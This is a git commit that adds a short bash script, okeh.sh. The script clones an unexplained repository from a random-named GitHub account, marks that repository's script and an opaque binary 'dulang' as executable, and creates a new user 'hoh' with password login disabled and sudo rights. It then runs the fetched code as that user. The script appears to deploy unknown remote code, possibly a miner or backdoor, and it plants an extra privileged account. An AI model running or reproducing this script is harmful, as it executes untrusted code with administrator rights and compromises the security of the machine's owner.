5da3ad800d222cdfc90c13b2abcdde67a56f71cb
fbgtrhy545t3wes <86541402+fbgtrhy545t3wes@users.noreply.github.com>
2021-06-28 07:41:10 +0700

    Create okeh.sh

---
+++ okeh.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/xfdbtry5e/ndasmu.git && cd ndasmu
+chmod +x okeh.sh && chmod +x dulang
+sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
+sudo -u hoh -H sh -c "./okeh.sh"
